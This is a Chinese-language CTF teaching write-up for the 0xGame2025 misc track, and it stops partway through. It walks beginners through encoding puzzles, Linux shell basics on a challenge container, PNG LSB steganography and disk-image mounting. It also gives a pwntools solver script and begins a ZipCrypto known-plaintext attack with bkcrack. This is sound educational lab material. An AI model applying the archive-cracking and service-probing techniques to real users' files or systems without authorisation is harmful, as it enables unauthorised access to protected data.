---
title: 0xGame2025 misc teaching
link: 0xgame2025-misc
sticky: false
catalog: true
tocNumbering: true
excludeFromSummary: false
date: 2026-02-03 21:23:45
description: 0xGame2025 Misc赛道出题解析与教学指南
tags:
  - 0xGame2025
  - misc
categories:
  - ['CTF']
cover: /img/cover/game.png
updated: 2026-02-03 13:22:59
---

# 0xGame2025 misc 赛题解析
> 0xGame2025 CTF Misc 赛道出题解析与教学指南
作者：Yo1o
>https://xz.aliyun.com/news/19232
>文章转载自 先知社区



我是 0xGame2025 的部分 Misc 的出题人，下面是针对 misc 方向的授课文案，希望能帮助刚踏上 ctf 路上的学弟学妹们快速入门

> 0xgame2025 所有题目归档传送门如下

- [0xGame2025Week1](https://www.ctfplus.cn/learning/problem/excellent-problemSet/detail/1975497062459904000)

- [0xGame2025Week2](https://www.ctfplus.cn/learning/problem/excellent-problemSet/detail/1978130369429377024)

- [0xGame2025Week3](https://www.ctfplus.cn/learning/problem/excellent-problemSet/detail/1980644777888059392)

- [0xGame2025Week4](https://www.ctfplus.cn/learning/problem/excellent-problemSet/detail/1983791961533845504)

## Week1

### Sign_in

题目只给我们一串编码，遇到这类题，就把它复制到`cyberchef`这类自动化解密[工具](https://cyberchef.org/)（我们经常管它叫赛博厨子）中，工具会帮我们检测出编码类型

ps:我们在飞书上有准备`cyberchef`的离线版本，下载解压后点击那个 html 文件就能用

> 这里希望学弟学妹们能看到一种陌生的编码就进行简单的学习，万变不离其宗，只要掌握其中几种编码原理，其他的编码方式也就能快速上手了

简单说说工具的使用，请注意，如果这里 output 右侧出现魔法棒，就说明，工具已经检测出字符串的可能编码方式，点击即可

{% note color:red 需要注意，该工具也有可能误判，如果说解密出来的东西不可读或者是别的错误情况，请及时的选择其他法子 %}
<img src="/img/0xgame2025/image-20250924174928073.png" alt="image-20250924174928073" style="zoom:50%;" />

Recipe 中出现 From base64，同时 output 也大变样，形式上很像我们要提交的 flag



<img src="/img/0xgame2025/image-20250924175758659.png" alt="image-20250924175758659" style="zoom:50%;" />这里先讲解清楚 Base64 编码原理

#### base64 编码原理

Base64 编码是使用范围特别广的一种编码方式，不管是图片，文字，音频等各类文件，都可以通过 base64 编码处理，便携发送到网上进行传输

正常的 Base64 编码用到的字符集是（A-Z, a-z, 0-9, +, /）共 64 个字符，但是注意，'A'在字符集的索引值是 0，'/'的索引值是 63，中间的就按照顺序进行递增

编码原理如下，先将传输的信息转换成二进制，然后这里的二进制串都是 8 位的，接下来 8 位变 6 位，3 个字母拆 4 组，接着 6 位二进制变十进制，然后按照十进制在 Base64 字符集中进行索引，上面说的 3 个字母拆 4 组，如果说拆的时候不够拆了，要用 0 填充，但是全是 0 的那组下面转换索引值后，用=号填充

下面是将明文 flag 转换成 base64 编码的原理示意图

<img src="/img/0xgame2025/base64convert.jpg" alt="base64convert" style="zoom:50%;" />


{% note color:green 这里有个小结论，遇到`Zmxh`别迟疑，说不定就是 flag 的 base64 编码呢？还有昂，这里我一直说的是编码而不是加密，所以注意一个小细节，以后不要说 base64 加密 %}


#### 凯撒密码原理

接下来拿到很像 flag 的字符串

```text
0hQkwo{Govm0wo_d0_0hQ4w3_2y25_@xn_r@mu_Pyb_peX}
0xGame{xxx}   #这一行给你们比对的
```

刷题数量足够多的话，能快速认识到，这个是凯撒密码这类的简单移位替换密码(仔细观察的话，会发现首字母的数字没变，符号没变，基本上就能往这里猜测了

加密原理就是将明文中的每个字母按照字母表顺序**向后（或向前）移动固定的位置**，得到密文。

> 加解密公式

- **加密**：`密文字母 = (明文字母位置 + 偏移量) mod 26`
- **解密**：`明文字母 = (密文字母位置 - 偏移量 + 26) mod 26`

所以说只要知道密文字母还有**shift**（偏移量）就能快速锁定明文字母

需要注意的地方如下：

凯撒密码进行替换的时候，应该先检测明文是大写还是小写

大写字母范围：`A(65)到Z(90)`

小写字母范围：`a(97)到z(122)`

由于这里的凯撒偏移指定在对应的大小写字母表中，所以我们的范围只有 0-25 的索引值，就是说，如果明文是大写，我们应该减去 65，用得到的结果进行偏移，然后进行 26 取余确保结果依然在字母表中，然后再+65 回到大写字母中，小写字母的解密操作是同样的原理

不过问题来了，我们这里并不知道 shift，好在索引值为 0-25，就 26 个选项，可以选择爆破，最坏的结果就是爆破到第 26 次，理论依据就是我上面说的，加上 shift 后，我们会对结果进行 26 取余，让最终得到的偏移值不会超过 26

这里还是建议自己手搓凯撒爆破解密脚本

> 什么？！你代码也写不好？女孩子请找我，我来教你写；男孩子也可以来找我，我可以考虑给你梆梆一拳

```python
def exp(str,shift):
    result=""
    for char in str:
        if char.isupper():
            result+=chr((ord(char)-65-shift)%26+65)
        elif char.islower():
            result+=chr((ord(char)-97-shift)%26+97)
        else:
            result+=char

    return result
def solver(str):
    for i in range(26):
        a=exp(str,i)
        if a.startswith("0xGame"):
            print(a)
            break

if __name__=="__main__":
    solver("0hQkwo{Govm0wo_d0_0hQ4w3_2y25_@xn_r@mu_Pyb_peX}")
#0xGame{Welc0me_t0_0xG4m3_2o25_@nd_h@ck_For_fuN}
```

### 公众号原稿

首先要知道一些前置知识

`.docx`文件的本质就是 zip 压缩包，与此类似的可读的文档（压缩包）格式有.xlsx 和.pptx

这是微软从 office 2007 开始引入的新的默认格式，遵循一个名为“**开放打包约定**”(Open Packaging Conventions,简称 OPC)。

在这个约定下，我们可以将一个`.docx`文件看成“披着 Word 外衣的 ZIP 压缩包”

关于约定格式上的细节，大家可以自己研究下，只需要知道，下次遇到这类题后，可以尝试将后缀名改成 zip，解压看看有没有什么特殊的文件在里面

```bash
[Content_Types].xml
_rels/
docProps/
    app.xml
    core.xml
word/
    document.xml      <-- 这里存放文档的主要文字内容
    styles.xml        <-- 这里存放样式信息
    media/
        image1.png    <-- 你插入的图片就在这里
    theme/
    _rels/
    ...
```

一般来说，解压**.docx**文件后，它的文件目录如上

本题中，你们解压后会在`docProps/`目录下看到 gift.xml，而这就是我为你们准备的 flag

<img src="/img/0xgame2025/2025-09-24-22-16-18-image.png" alt="2025-09-24-22-16-18-image" style="zoom:50%;" />

### ez_shell

> > 注意：本题是 SSH 容器连接题目
>
> 本题是一道帮助新生接触 Linux 命令的引导题，其他佬可以跳过下面的引导部分，需要提交的 flag 组成如下：
>
> - `whoami`命令的结果
> - `pwd`命令的结果
> - 当前路径下的文件夹名（除去上级路径和当前路径符号
> - 该文件夹下面的 flag1.txt 文件内容
> - `/root`下的 flag2.txt 文件内容
>
> 上述结果需要用'_'连接，然后用 0xGame{}包裹，最终 flag 样例：`0xGame{who_pwd_xxx_xxx_xxx}`
>
> 会用到的信息：
>
> - **ssh**连接：`hacker/h@cker_it`
> - **root**用户：`root/Y0u_@re_root`

---

如何如何👀？

是第一次接触 shell 吗，解决不了的话，我来教你,这里有个[Linux 命令大全](https://www.linuxcool.com/)，先放这，猜你不会仔细看，好好看看我下面的引导步骤吧，敲黑板昂！！！

<div align="right">
<img src="/img/0xgame2025/如何？.jpg" alt="如何？" style="width:30%;">
</div>




#### 引导

> 也许我有没说明白的点，可以随时找我，或者自行研究解决

遇到这样的`tcp`容器题目，需开启容器，会得到类似这样的内容`nc1.ctfplus.cn 34857`

前面部分可以是 IP 地址也可以是域名，后面的数字是端口号，注意，中间是空开的，和 http 的':'连接有所差异

常见的 tcp 服务是使用**netcat**这样的工具进行 nc 连接的，但是题目描述中，说到了，这个是 ssh 容器题目，而且给出了连接账密，需要我们通过 ssh 进行远程连接

---

- step1 进入 shell

在终端中输入:

```bash
ssh hacker@nc1.ctfplus.cn -p 34857
```

`tips:powershell,cmd,linux终端等都可以滴`

一般来说，ssh 服务是用默认端口 22 连接的，就是说在平时连接靶机的时候可以不用-p 指定端口，而这里是由于 docker 容器进行了端口转发才需要我们指定对应的端口号进行连接

上面看不懂问题不大，需要清楚一点，连接 ssh 需要指定靶机上有远程连接权限的用户，比方说本题中，只有 hacker 用户能 ssh 连接，root 不可以

```bash
ssh hacker@nc1.ctfplus.cn -p 34857
The authenticity of host '[nc1.ctfplus.cn]:34857 ([103.85.86.154]:34857)' can't be established.
ED25519 key fingerprint is SHA256:heNboAPQQACbtUAWuJK45JXDMmx2YFFmYkGyVhd17e0.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[nc1.ctfplus.cn]:34857' (ED25519) to the list of known hosts.
hacker@nc1.ctfplus.cn's password:
Welcome to Alpine!

The Alpine Wiki contains a large amount of how-to guides and general
information about administrating Alpine systems.
See <https://wiki.alpinelinux.org/>.

You can setup the system with the command: setup-alpine

You may change this message by editing /etc/motd.

dep-428f3ef5-705a-4364-a5ee-e59fc8e1fc00-5d4c55ff4b-gpflw:~$
```

回车运行命令后会出现一大段安全验证的信息，不用管，大致意思是说本电脑第一次连接该服务器，主机列表中找不到对应的身份记录，然后输出了服务器的公钥指纹，用来验证服务器身份的，这个时候，我们需要输入`yes`来同意连接，然后服务器公钥会保存在本地~/.ssh/known_hosts 文件中，下次连接的时候就不会触发警告

接下来是输入密码`h@cker_it`，这里你们会不会因为看不到输入的内容误以为机器出问题了？O(∩_∩)O

这是 Linux 系统出于安全考虑的设计，为了防止旁观者在我们输入密码时看到任何视觉反馈（包括星号、圆点等）但是我们的每一次输入都是被正常记录的，所以一定要注意不要打错字哦，复制进去也是可以的（这个设计熟悉就好，几乎所有 Linux 系统都是这样的，就好比手机某网站的登录页面，输入密码全用"·"进行替代

登录后看到类似`hostname:~$` 的字样，就表示我们登录成功，那么恭喜你第一次进入 shell 成功了🥳🥳🥳

- step2 开始答题

所有 Linux 的基础命令都一样的，详细介绍还是请看我上面放置的网页链接,下面仅仅讲述题目中要用到的命令，也是我们经常用的

-- whoami

很显然，是 who am i（我是谁），用途是显示当前用户名

```bash
yolo@yolo:~$ whoami
yolo
```

-- pwd

print working directory，功能是显示当前工作目录的绝对路径

```bash
yolo@yolo:~$ pwd
/home/yolo
```

-- ls

真是最最常用的命令，用途是列出当前路径下的文件及其属性信息，但是经常要结合参数使用

```plain
yolo@yolo:~$ ls
yolo@yolo:~$ ls -la
total 12
drwxr-xr-x  3 yolo yolo 4096 Sep 26 17:58 .
drwxr-xr-x 11 yolo yolo 4096 Sep 26 17:56 ..
drwxr-xr-x  2 yolo yolo 4096 Sep 26 17:58 .secret
```

第一个 ls 会单纯列出正常无隐藏的文件名或文件夹名，在 Linux 中，像.xxx 这样的，名字前面是'.'的文件或文件夹会被系统默认隐藏，需要使用-a 显示所有文件，包括隐藏的；-l 会列出文件的属性，包括文件类型、权限、编辑时间、所有者等等

> 这里的.代表的是当前目录，是一种相对路径，..代表的是上一级路径，前面的**drwxr-xr-x**交给你们自己研究

-- pwd

本命令可以改变当前路径，和我们在 Windows 桌面双点某文件夹进去看里面的内容的操作类似

```plain
yolo@yolo:~$ pwd
/home/yolo
yolo@yolo:~$ cd .secret
yolo@yolo:~/.secret$ pwd
/home/yolo/.secret
```

-- cat 

本命令可以读取指定文件的内容，正常来说，推荐用 cat 读取那些小点的，纯文本的文件，比方说 flag.txt 这样的，其他情况下，有其他命令可以用，比如 more,less 等等，自个研究昂

```plain
yolo@yolo:~/Desktop/.secret$ ls
flag1.txt
yolo@yolo:~/Desktop/.secret$ cat flag1.txt
congratulation!
```

-- su root

Linux 对于权限的概念很严格（当然 Windows 同样，只是不常见

一些文件或路径，需要高权限乃至 root 用户才能进入，这个时候，我们需要使用 su xxx 指定切换用户，同样需要使用登录密码

```plain
yolo@yolo:~/.secret$ cd /root
-bash: cd: /root: Permission denied
yolo@yolo:~/.secret$ su root
Password:
root@yolo:/.secret# cd /root
root@yolo:~# pwd
/root
```

这里我给用户同样设置了不用密码的 sudo 权限，允许用户 yolo 不输入密码的情况下直接执行 root 权限命令

```plain
yolo@yolo:~/.secret$ id
uid=1000(yolo) gid=1000(yolo) groups=1000(yolo)
yolo@yolo:~/.secret$ sudo su
root@yolo:/home/yolo/.secret# id
uid=0(root) gid=0(root) groups=0(root)
root@yolo:/home/yolo/.secret# cd /root
root@yolo:~# cat flag2.txt
hacker!
```

- step3 合成 flag

```plain
0xGame{yolo_/home/yolo_.secret_congratulation!_hacker!}
```



> 我猜真有人把上面的 flag 交上去了吧，梆梆锤你呢，自个做一遍，熟悉下，然后这里学长给出建议，一定要多用，越学到后面，我们的命令行工具使用的就越多，而且，在终端上操作没有一种黑客体验感吗？多 cool!

<div align="center">
<img src="/img/0xgame2025/7c3be7774e8d988c5409a15e55949b22.jpg" alt="cool" style="width:30%;">
</div>



### Zootopia

这个题的考点很基础，是 png 图片的 LSB 隐写，下面就简单说说 lsb 的隐写原理，如果对其他 png 隐写方法感兴趣，可以看看这篇[博客](https://www.yo1o.top/posts/png-challenge/)

> 嗯，没错，是我写的

#### lsb 原理

首先有个大概的理解，在 png 图片中，一个像素点在文件数据中存储的大小是三个字节，比较常见的模式是按照 rgb 进行存储的（模式有很多种，但是 rgb 确实是最常见，其他的模式对应的隐写原理和下面的一样

rgb 三个颜色通道的范围都是`[0-255]`
> 别记岔了！！！
{: .prompt-warning }

```text
几个常见的颜色
红色：(255,0,0)
绿色：(0,255,0)
蓝色：(0,0,255)
白色：(255,255,255)
```

然后在文件内部，数据是按照 8 位二进制进行存储的，比方说某个像素点的值是(111,222,225)，那么在存储中，对应的值是(01101111,11011110,11100001)

然后这里，我们定义每个 8 位二进制的最后一位为`LSB`  (**Least Significant Bit**,最低有效位)

所谓的 lsb 隐写就是对每个二进制的最低有效位进行编辑，使用 01 二进制进行隐写信息，可以藏文件，也可以藏字符串，同样，颜色通道的选择也很多样性，可以仅仅对 R 通道进行隐写，也可以选择两个以上……

在 lsb 的原理基础上，颜色通道隐写还能拓展到其他的通道中，也就出现了`MSB` (**Most Significant Bit**,最高有效位)或者其他混乱通道隐写（组合起来很多，不过原理都是一样的

> 编者补充：lsb 隐写相对 msb 而言，有个显著的优势，那就是对整个画面影响不大，或者说我们肉眼几乎看不清隐写前后的差异

#### 解密 LSB

解决方式很多，由于 lsb 的提取稍微麻烦点，我们这里就不细说脚本怎么搓（写提取脚本老麻烦了呢

推荐的解密工具有`Stegsolve`,`Zsteg`

##### stegsolve

前者是有可视化界面的提取通道隐写的工具，同样也有对单个颜色通道提取查看图片的功能，还有 xor 等等操作，目前来看，我感觉这个最好用

<img src="/img/0xgame2025/image-20251001160837872.png" alt="image-20251001160837872" style="zoom:50%;" />

先导入图片（你把 png 图片给拉进去也没问题

**Analyse->Data Extract->勾选 Red,Green,Blue 三个通道的最后一位->选中 LSB First(虽说感觉没用)->Preview**

通过上述操作，我们能看到文件最前面隐藏了 flag，但是在当前情况下，直接复制，会顺带把左边的十六进制数据复制到，建议把 preview 上面的`Include Hex Dump In Preview`取消勾选，重新 Preview 下，就好复制 flag 了（复制出来的结果中间有空格，自行删减就好

##### zsteg

后者是命令行工具，可以帮我们检测多个颜色通道可能有的隐写信息，提取也很好提

正常来说，直接`zsteg xxx.png`可以显示大部分可读的颜色通道隐写的部分内容，然后一些情况下，我们可能会发现稍大文件被隐写进去，这时候我们需要使用**-E xxx<通道组合>** 来完整提取隐写数据到文件中

<img src="/img/0xgame2025/image-20251001161738864.png" alt="image-20251001161738864" style="zoom:50%;" />

```text
0xGame{W1_Need_t0_t@k3_a_break}
```

### ezshell_PLUS

本题是 ezshell 的进阶，就是看看大家的自学能力如何，下面我给出我的步骤

<img src="/img/0xgame2025/image-20251001163833641.png" alt="image-20251001163833641" style="zoom:50%;" />

```bash
sha256sum files/* | grep -i "021832def36ccd081b38d8fd51b534d70826b5df4423ce2c15386797ab08bef8"
```

我猜测这里让你们感觉新奇吧，就是用了个管道符，让前一步的输出作为后一步的输入

然后用到了 sha256sum，grep 命令，这些也很常见，分别是计算哈希和查找

然后这里有个”*“，它被叫做通配符，可以匹配任意字符

> 学长只能说，多见多学多用，命令行用熟悉，会对后面的学习帮助很大

### Do not enter

本题考察了 dd 镜像挂载与分析

我们首先用 file 命令查看镜像的基本结构

```bash
file do_not_enter.dd
do_not_enter.dd: DOS/MBR boot sector; partition 1 : ID=0x83, start-CHS (0x10,0,1), end-CHS (0x28f,3,32), startsector 2048, 81920 sectors; partition 2 : ID=0x83, start-CHS (0x2a0,0,1), end-CHS (0x3ff,3,32), startsector 86016, 81920 sectors; partition 3 : ID=0xf, start-CHS (0x3ff,3,32), end-CHS (0x3ff,3,32), startsector 169984, 178176 sectors
```

从输出可以看出，**do_not_enter.dd**是一个 MBR（主引导记录）格式的磁盘镜像，包含一个引导扇区和三个分区

- 分区 1 和 2 是 Linux 原生分区（类型 0x83)
- 分区 3 是扩展分区（类型 0x0f),通常用于容纳更多逻辑分区

上面看不懂问题不大，反正和下面的解题过程没多少关系，做多了，就会有更深的体会(●'◡'●)

> 💡 小知识：MBR 是一种较老但广泛支持的分区方案，现代系统更多使用 GPT，但大多数 Linux 工具（如 `fdisk`、`mount`、`losetup` 等）依然能很好地处理 MBR 镜像。
> 如果你还不熟悉“引导扇区”“分区表”这些概念，没关系！你可以简单把它理解为：**这个 `.dd` 文件就像是把一整块硬盘“拍了张快照”保存下来了**。我们要做的，就是用合适的工具把这个“虚拟硬盘”挂载到系统里，像打开普通文件夹一样去查看里面的内容。

#### 做法

**第一步：创建循环设备映射**

```plain
sudo losetup -fP do_not_enter.dd
```

命令解释：

- losetup:linux下的循环设备管理工具，能将文件虚拟成块,换句话说，就是把一个 dd 文件转换成机器磁盘可以读的格式
- -f:自动查找第一个可用的 loop 设备
- -P：关键参数！让内核在关联后重新扫描分区表，自动创建分区设备节点
- 作用：将 DD 镜像文件虚拟成一个”硬盘“，系统会识别出其中的分区结构

**第二步：验证设备映射状态**

```plain
sudo losetup -a
```

命令解释：

- -a:显示所有活跃的 loop 设备状态

**第三步：识别分区结构与标签**

```plain
lsblk -f /dev/loop0 #后面的/dev/loop0是通过第二步得到的
```

命令解释：

- lsblk:列出块设备信息的专业工具
- -f:显示文件系统信息，包括分区标签
- 我的考点其实就是这里，就像题目说的那样，我们应该选中那个 do_not_enter 的标签

**第四步：挂载目标分区**

```plain
mkdir -p /mnt/test
sudo mount /dev/loop0p2 /mnt/test
```

命令解释：

- mount:标准的文件系统挂载命令
- /dev/loop0p2:我们要挂载的分区设备 #这里的参数是通过第三步得到的
- /mnt/test：我们设置的挂载点目录
- 底层原理：将分区中的 ext4 文件系统挂载到目录树，使文件可访问

**第五步：搜索 flag 内容**

```plain
sudo grep -r "0xGame" /mnt/test
```

命令解释：

- grep:强大的文本搜索工具
- -r:递归搜索，遍历目录下的所有文件
- "0xGame":flag头

**第六步：清理**

```plain
sudo umount /mnt/test
sudo losetup -d /dev/loop0
sudo rmdir /mnt/test
```

本题还有其他工具能快速挂载，比如说**kpartx**

然后关于**blkid**，也能用它来读取那个分区的标签，在某些情况下，它可以和**lsblk**换着用

| 特性         | **`blkid`**                         | **`lsblk`**                      |
| ------------ | ----------------------------------- | -------------------------------- |
| **主要功能** | 读取**文件系统**的元数据和属性      | 显示**块设备**的拓扑结构和关系   |
| **数据来源** | 读取文件系统的超级块(superblock)    | 查询内核的块设备信息(sysfs)      |
| **输出视角** | **文件系统视角**                    | **设备拓扑视角**                 |
| **信息类型** | 文件系统特定属性(UUID, LABEL, TYPE) | 设备层次关系(父子、大小、挂载点) |
| **使用场景** | 按属性识别和挂载文件系统            | 理解磁盘分区结构和布局           |

然后下面是我给出的参考步骤，可以看出在正确步骤下，我们只能找到一个完完整整的 flag 的，fake flag 真的一点也没为难大家的（盲猜有人说我胡乱塞东西，哈哈

```bash
~$ sudo losetup -fP do_not_enter.dd
~$ sudo losetup -a
/dev/loop0: [2096]:536444 (/home/yolo/Desktop/timu/0xGame_challenge/do_not_enter.dd)
~$ lsblk -f /dev/loop0
NAME      FSTYPE FSVER LABEL        UUID                                 FSAVAIL FSUSE% MOUNTPOINTS
loop0
├─loop0p1 ext4   1.0   UserShare    5a6be8f0-43f9-4020-a729-510d6d57e95b
├─loop0p2 ext4   1.0   Do_not_enter 643298ec-2a07-4681-9555-addf90de8ae1
├─loop0p3
├─loop0p5 ext4   1.0   WebServer    f965eed6-3de2-4533-8e06-2c816f9e4574
└─loop0p6 ext4   1.0   SysLogs      650ce632-c57e-41c6-8a3b-c6bf3d4e2193
~$ sudo mount /dev/loop0p2 /mnt/test
~$ sudo grep -r "0xGame" /mnt/test
/mnt/test/syslog:0xGame{WoW_y0u_fouNd_1t?_114514}
~$ sudo umount /mnt/test
~$ sudo losetup -d /dev/loop0
~$ sudo rmdir /mnt/test
```

<img src="/img/0xgame2025/image-20251002010301159.png" alt="image-20251002010301159" style="zoom:50%;" />

一些其他工具（Windows，本意还是让大家掌握 dd 镜像挂载方式，但是赖我，没有给大家说清楚，应该关注分区标签，为各位师傅解题时候造成困扰感到抱歉

- AXIOM

<img src="/img/0xgame2025/image-20251009225550160.png" alt="image-20251009225550160" style="zoom:50%;" />

- DiskGenius

<img src="/img/0xgame2025/image-20251009225621434.png" alt="image-20251009225621434" style="zoom:50%;" />

- R-Studio

<img src="/img/0xgame2025/image-20251009225641928.png" alt="image-20251009225641928" style="zoom:50%;" />

#### 学长碎碎念

关于本题，我设置了 180 个 fake flag，目的就是希望新生们采取专业工具科学地进行分析，而不是使用 strings 暴力手撕，然后在 Windows 这边，有人用 axiom 能读出标签名，我测试过 autopsy，发现不能显示分区标签，而且一些选手和我聊过，他们用火眼、取证大师等等著名一把梭取证工具也没能解决出来（~~可见我出的题还蛮好~~ ，其实是希望学弟学妹们在后面的学习中，会遇到越来越多的一把梭脚本或者说是妙妙小工具，我并不排斥使用的，但是！我希望你们能掌握对应的原理并亲手用自己的"笨"方法解决出一两道后再选择是否使用所谓的“一把梭”，不然，没了好用的神奇小工具，你还能做出什么呢？

> 在我看来，一把梭工具应该被用在重要赛事抢血上，而不是简单小比赛上冲榜用的

接下来关于 AI，这个是近年来最热门的东西，有了 ai，对你们入门 ctf 的帮助会非常非常大，不用觉得啥事都问 ai 会不好意思，因为我也最开始啥也不懂，这样过来的。所以还是很鼓励大家学习新知识的时候，先自己研究，卡住的话询问 ai 解决方案，接下来才是找圈子内厉害的师傅（一定要整理并描述清楚自己遇到的问题，不然对他们来说，帮你解惑的难度会上一个档次,haha

然后每次从 ai 那里拿到解决方案，希望你们能从中学习到一些，而不是无脑的**ai 说啥你干啥**，不然下次遇到类似的问题，我们再问一遍 AI？这也就带出了我下面给大家的忠告：一定`合理`使用 AI，趁着 AI 在旁边，我们多通过它学习一些新知识，等我们用不了的情况下，也不会手足无措（想象这样一个情景，如果说你啥事只会问 ai，那么你所做的事情是不是任何人都能替代？是不是说你失去了 ai，会一点竞争力都没有？

## Week2

> 从 week2 开始，赛题难度上升，这也就意味着大家需要提升学习效率，争取在短时间内学会更多的知识点

### 这个 b64 不太对啊


> 小拓展
{: .prompt-success }


> 交互出现的中文乱码对解题没有任何影响，但是为了解题体验，可以选择下述方式优化：
优先建议使用 Linux 的终端，wsl2,虚拟机均可，它们支持 utf-8
如果是使用 cmd，请 nc 连接容器之前，输入`chcp 65001`回车，将编码方式从 gbk 切换成 utf-8 后再 nc 连接
如果说是 powershell，这个稍微麻烦点
需要实现操作如下：依次将下面三个命令输入到 powershell 中
> `chcp 65001`
> `[Console]::InputEncoding = [System.Text.Encoding]::UTF8`
> `[Console]::OutputEncoding = [System.Text.Encoding]::UTF8`



> 本题可以变相的看作一道密码简单题，既然想学 misc，各个方向都要有所了解

base64 原理，我给大家在 week1 上讲的很清楚了，然后本题的考法是将字符集索引表自定义，选手们需要通过将明文和密文进行对比，反推字符集，获取 flag，这里面是有多种解决方法的，一个一个字符进行手动拼接也可行，不过我下面讲解一个相对高效的方法：

我们先回顾 base64 编码原理

```text
三个字节转换为24位的二进制数据，然后分割整理成4组6位二进制，将它们转换成十进制作为索引值，最后就是在base64字符集中找到对应的密文字符进行拼接。

这里有个结论，那就是3个明文字符编码后一定会得到4个字符的密文，且不可能出现=作为填充。

ps：如果你在 Linux 中用 echo "abc" | base64 会得到带 = 的结果，那是因为 echo 默认会在字符串末尾添加一个换行符 \n，导致实际输入是 4 个字节（abc\n），而 Base64 对非 3 的倍数字节会填充 =。若使用 echo -n "abc" | base64 或 Python 的 base64.b64encode(b"abc")，就不会有填充。
```

在 Base64 编码中，每 3 个字节被划分为 4 个 6 位组。其中，**第 4 个 6 位组完全由第 3 个输入字节的低 6 位构成**（因为前两个字节共 16 位，只能影响前 3 个 6 位组）。因此，无论前两个字节是什么，只要固定它们，改变第 3 个字节，第 4 个输出字符就只由第 3 字节的低 6 位（即 `byte3 % 64`）决定。（所以说 `'AA'` 完全是占位符，你可以用任意两个可打印字符代替，比如 `'BB'`、`'!!'` 等，只要保持固定即可。

下面我们拿 AAX 举例（标记：这里的 X 是任意可打印字符,然后 AA 仅仅是用来占位

```text
已知：A：ASCII值为65
     X:ASCII值[33,126],只要是可打印字符都可，我们下面转换二进制的时候用'x'代替(x只能取值0或1

  明文   |   A     |    A     |    X
8位二进制 |01000001 | 01000001 | xxxxxxxx
我们拿正常字符集顺序(A-Z,a-z,0-9,+,/)进行举例
A(65),/(47)
举例一：
   A        A         A
01000001 01000001 01000001
010000 010100 000101 000001
  16     20     5      1    <----这里的索引值是1没有任何问题，字符集索引是从0开始的
   Q      U     F      B    <----这里，B正好是标准字符集的第二个

举例二：
   A        A         /
01000001 01000001 00101111
010000 010100 000100 101111
  16     20     4      47    <----这里的索引值是47
   Q      U     E      v    <----这里，v正好是标准字符集的第48个
```

大家有没有看出来什么？

> 感觉还是很懵逼的话，可以手上算算，划拉一下，一定能有所悟

我这里稍微归纳整理了下，使用第 3 个字母的 ASCII 值直接对 64 进行取余运算，拿到的值就是第 4 个密文的索引值，其中的数学原理和上面举的例子（取低 6 位）是一样的，比如说 A(65)，对 64 进行取余的结果是 1，然后/(47)，对 64 取余是 47，计算结果完全是低 6 位转换十进制的结果

*脚本的核心原理：**Base64 编码后第 4 个字符的索引值，等于第 3 个输入字节的低 6 位（即 `byte3 % 64`）**。*

```python
import base64
import string
from pwn import *

HOST = 'nc1.ctfplus.cn' 
PORT = 38453 

def solve():
    try:
        p = remote(HOST, PORT)
    except PwnlibException as e:
        print(f"[ERROR] 无法连接到服务器 {HOST}:{PORT}. 错误: {e}")
        return

    
    p.recvuntil(b'Choose an option (1/2): ')
    p.sendline(b'1')
    p.recvuntil(b'> ')

    
    charset_map = {}
    PROBE_START = 33
    PROBE_END = 96 #33 + 64 - 1 = 96，连续64个ASCII字符足以覆盖所有 (i % 64) 的可能值
    
    i = PROBE_START
    while len(charset_map) < 64:
      
        if i > PROBE_END:
            # 理论上不可能触发的
            p.error("FATAL: Failed to discover all 64 characters within the visible range (33-126). Aborting.")
            p.close()
            return

        probe_char = chr(i)
        # 'AA' + 探测字符 X
        probe_data = ('AA' + probe_char).encode('ascii')

        p.sendline(probe_data)
        
        p.recvuntil(b'Result: ')
        encoded_result = p.recvline().strip().decode()
        
        if len(encoded_result) < 4:
             p.warn(f"i={i} ({probe_char}): Unexpected result length {len(encoded_result)} ('{encoded_result}'). Skipping.")
             i += 1
             continue
        
        # 精确提取第 4 个字符 (索引 3)
        target_char = encoded_result[3]

        target_index = i & 0x3f #0x3f = 63，位运算取最后6位 
        #target_index = i % 64  #上下两种写法等价，取余运算，本质上都是直接拿到低6位
 #一些数学上的解释：因为 64 是 2 的幂，i % 64 等价于取 i 的低 6 位，即 i & 0x3F，位运算更快
        
        if target_index not in charset_map:
            # 严格排除填充字符 '='
            if target_char == '=':
                 p.warn(f"i={i} ({probe_char}): Encountered unexpected '=' character. Skipping this index {target_index}.")
                 i += 1
                 continue
                 
            charset_map[target_index] = target_char
        
        print(f"\r[*] Progress: {len(charset_map)}/64 discovered", end="")
        i += 1

    print("\n[+] Charset map fully discovered!")
    final_charset = "".join(charset_map.get(k, '?') for k in range(64))

    if '?' in final_charset:
        p.error(f"Build failed. Resulting charset is incomplete: {final_charset}")
        p.close()
        return
        
    if len(set(final_charset)) != 64:
        p.error(f"Build failed. Resulting charset contains duplicates or invalid chars: {final_charset}")
        p.close()
        return

    p.success(f"Reconstructed charset: {final_charset}")
    p.sendline(b'!q')
    p.recvuntil(b'Choose an option (1/2): ')
    p.sendline(b'2')
    p.recvuntil(b'Your charset guess: ')
    p.sendline(final_charset.encode())
    
    p.success("Charset submitted! Receiving flag...")

    flag_output = p.recvall(timeout=2).decode()
    print("\n" + "="*20 + " FLAG " + "="*20)
    print(flag_output)
    print("="*46)
    
    p.close()

if __name__ == "__main__":
    solve()
```

> 解决方式真的很多，Spreng 师傅还有个纯密码测试脚本，如果对这个知识点感兴趣可以和他探讨一二

### 开锁师傅

本题是 zip 压缩包攻击分类中的明文攻击，可以看到的，压缩包中存在一个 png 图片，一些 png 文件结构相关的知识，请上网搜索

我们会用到的部分知识是 png 有固定的魔数头：`89 50 4E 47 0D 0A 1A 0A 00 00 00 0D 49 48 44 52`

<img src="/img/0xgame2025/20251013231154_006.webp" alt="image-20251007130940004" style="zoom:50%;" />

可以说，所有正常的 png 文件头，前面这 16 字节一定是一样的，分别是文件魔数标志以及 IHDR 数据块的名称，大家可以自己动手看看

接下来说说明文攻击实现的利用方法

> 关于明文攻击的实现原理，可以参考这位佬的博客文章https://flandre-scarlet.moe/blog/1685/

简单说明，实现 zip 明文攻击的前提分别是：

- 压缩包的压缩方式必须是 ZipCrypto 加密（deflate 或 Store 模式均可）
- 必须已知 8 字节的连续明文和对应偏移，进行恢复密钥，然后还需要 4 字节明文参与密钥验证，4 字节明文可以与 8 字节明文不连续，明文知道越多，解密速度越快

正常而言，我们使用 bkcrack 工具进行明文攻击居多

#### how to solve

- step 1

